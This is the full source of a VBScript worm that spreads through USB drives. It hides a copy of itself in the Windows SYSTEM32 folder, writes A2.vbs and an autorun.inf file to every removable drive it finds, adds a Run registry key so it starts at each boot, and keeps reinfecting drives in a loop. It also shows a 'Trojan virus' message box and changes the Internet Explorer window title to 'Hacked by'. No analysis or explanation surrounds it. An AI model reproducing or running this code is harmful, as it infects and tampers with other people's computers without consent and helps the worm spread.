On error resume Next
Dim mysource,winpath,flashdrive,fs,mf,atr,tf,rg,nt,check,sd,oldname,newname,rgname
Dim text,size
Set fs = createobject("Scripting.FileSystemObject")
Set WNet = WScript.CreateObject("WScript.Network")
Set mf = fs.getfile(Wscript.ScriptFullname)
oldname=CStr(fs.getfilename(Wscript.ScriptFullname))
newname = WNet.ComputerName & ".vbs"
'A2.vbs A2.vbs A2.vbs A2.vbs A2.vbsA2.vbsA2.vbsA2.vbsA2.vbs
rgname = Replace(newname,".vbs","")
atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe A2.vbs"
size = mf.size
check = mf.drive.drivetype
Set text=mf.openastextstream(1,-2)
do while not text.atendofstream
mysource=mysource&text.readline:mysource=mysource & vbcrlf
Loop
mysource=Replace(mysource,oldname,newname)
Do
Set winpath = fs.getspecialfolder(0)
Set tf = fs.getfile(winpath & "\SYSTEM32\" & newname)
tf.attributes = 32
Set tf=fs.createtextfile(winpath & "\SYSTEM32\" & newname,2,true)
tf.write mysource
tf.close
Set tf = fs.getfile(winpath & "\SYSTEM32\" & newname)
tf.attributes = 39
For each flashdrive in fs.drives
If (flashdrive.drivetype = 1) and flashdrive.path <> "A:" Then
Set tf=fs.getfile(flashdrive.path &"\A2.vbs")
tf.attributes =32
Set tf=fs.createtextfile(flashdrive.path &"\A2.vbs",2,true)
tf.write mysource
tf.close
Set tf=fs.getfile(flashdrive.path &"\A2.vbs")
tf.attributes =39
Set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
Set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write atr
tf.close
Set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
End if
next
Set rg = createobject("WScript.Shell")
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & rgname & "",winpath&"\SYSTEM32\" & newname
if check <> 1 then
If Int((100-1+1)* Rnd+1)=9 And Int(Day(date))=9 Then
MsgBox "Mutation of Trojan virus!"
End if
Wscript.sleep 60000
Else
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","Hacked by " & Replace(oldname,".vbs","")
End If
loop while check<>1
Set sd = createobject("Wscript.shell")
sd.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
